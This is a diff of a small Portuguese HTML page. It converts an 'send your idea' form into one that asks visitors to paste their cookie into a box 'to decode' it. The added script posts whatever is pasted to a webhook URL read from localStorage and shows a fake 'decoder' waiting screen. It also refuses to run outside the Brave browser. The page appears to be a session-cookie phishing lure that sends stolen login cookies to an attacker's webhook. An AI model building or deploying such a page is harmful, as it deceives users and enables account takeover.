@@ -2,46 +2,111 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Envie sua ideia</title>
+  <title>Enviar ideia</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { background:#0f0f0f; color:#fff; font-family:Arial; display:flex; align-items:center; justify-content:center; height:100vh }
-    .box { background:#1c1c1c; padding:25px; border-radius:14px; width:90%; max-width:500px }
-    textarea, button { width:100%; padding:12px; margin-top:12px; border-radius:10px; border:none }
-    textarea { background:#2a2a2a; color:#fff }
-    button { background:#5865F2; color:#fff; font-weight:bold; cursor:pointer }
+    body {
+      margin: 0;
+      background: #0f0f0f;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .box {
+      background: #1c1c1c;
+      padding: 24px;
+      border-radius: 14px;
+      width: 90%;
+      max-width: 500px;
+    }
+    textarea, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 12px;
+      border-radius: 10px;
+      border: none;
+      font-size: 14px;
+    }
+    textarea {
+      background: #2a2a2a;
+      color: #fff;
+      resize: none;
+      height: 120px;
+    }
+    button {
+      background: #5865F2;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
+
   <div class="box" id="app"></div>
 
   <script>
-    const params = new URLSearchParams(window.location.search);
-    const webhook = decodeURIComponent(params.get('w'));
-    const nome = location.pathname.replace('/', '');
+    // 🔒 BLOQUEIO FORA DO BRAVE
+    if (!navigator.brave) {
+      document.body.innerHTML = `
+        <div style="
+          background:#0f0f0f;
+          color:#fff;
+          font-family:Arial;
+          height:100vh;
+          display:flex;
+          align-items:center;
+          justify-content:center;
+          text-align:center;
+          padding:20px;
+        ">
+          <div>
+            <h2>Navegador não suportado</h2>
+            <p>Esse site funciona apenas no <b>Brave Browser</b>.</p>
+            <p>Por favor, baixe o brave e entre no site por ele</p>
+          </div>
+        </div>
+      `;
+      throw new Error("Not Brave");
+    }
+
+    // 🧠 LÓGICA DO SITE
+    const nome = location.pathname.replace("/", "");
+    const webhook = localStorage.getItem("webhook_" + nome);
+    const app = document.getElementById("app");
 
     if (!webhook) {
-      document.getElementById('app').innerHTML = '<h3>Link inválido 💀</h3>';
+      app.innerHTML = `
+        <h3>Site não encontrado</h3>
+        <p>Busque ajuda com quem te mandou o site.</p>
+      `;
     } else {
-      document.getElementById('app').innerHTML = `
-        <h2>Envie sua ideia pra ${nome}</h2>
-        <textarea id="msg" placeholder="escreve aí..."></textarea>
-        <button onclick="send()">Enviar</button>
+      app.innerHTML = `
+        <h2>Envie o Cookie para Decodificar</h2>
+        <textarea id="msg" placeholder="Preencha"></textarea>
+        <button onclick="enviar()">Enviar</button>
       `;
     }
 
-    function send() {
-      const msg = document.getElementById('msg').value;
-      if (!msg) return alert('manda algo aí');
-      
+    function enviar() {
+      const msg = document.getElementById("msg").value;
+      if (!msg) return alert("Por favor, preencha");
+
       fetch(webhook, {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ content: msg })
       });
 
-      document.getElementById('app').innerHTML =
-        '<h2>Loading... ⏳</h2><p>Ideia enviada 😎</p>';
+      app.innerHTML = `
+        <h2>Enviando para o Decodificador</h2>
+        <p>Espere o Decodificador Decodificar...</p>
+      `;
     }
   </script>
+
 </body>
 </html>
